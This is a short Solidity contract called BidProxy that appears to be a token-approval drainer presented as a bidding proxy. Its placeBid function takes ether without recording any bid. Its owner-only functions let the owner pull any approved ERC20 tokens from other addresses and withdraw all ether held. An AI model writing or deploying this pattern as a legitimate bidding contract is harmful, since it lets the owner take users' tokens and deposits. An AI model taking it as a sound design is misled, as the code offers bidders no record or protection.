// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract BidProxy {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    fallback() external payable {}

    function transfer(
        IERC20 _token,
        address _sender,
        address _recipient,
        uint256 _amount
    ) external returns (bool) {
        require(msg.sender == owner, "Contract ownership required");
        return _token.transferFrom(_sender, _recipient, _amount);
    }

    function placeBid() external payable {}

    function withdraw(address payable _recipient, uint256 _amount) external {
        require(msg.sender == owner, "Contract ownership required");
        _recipient.transfer(_amount);
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}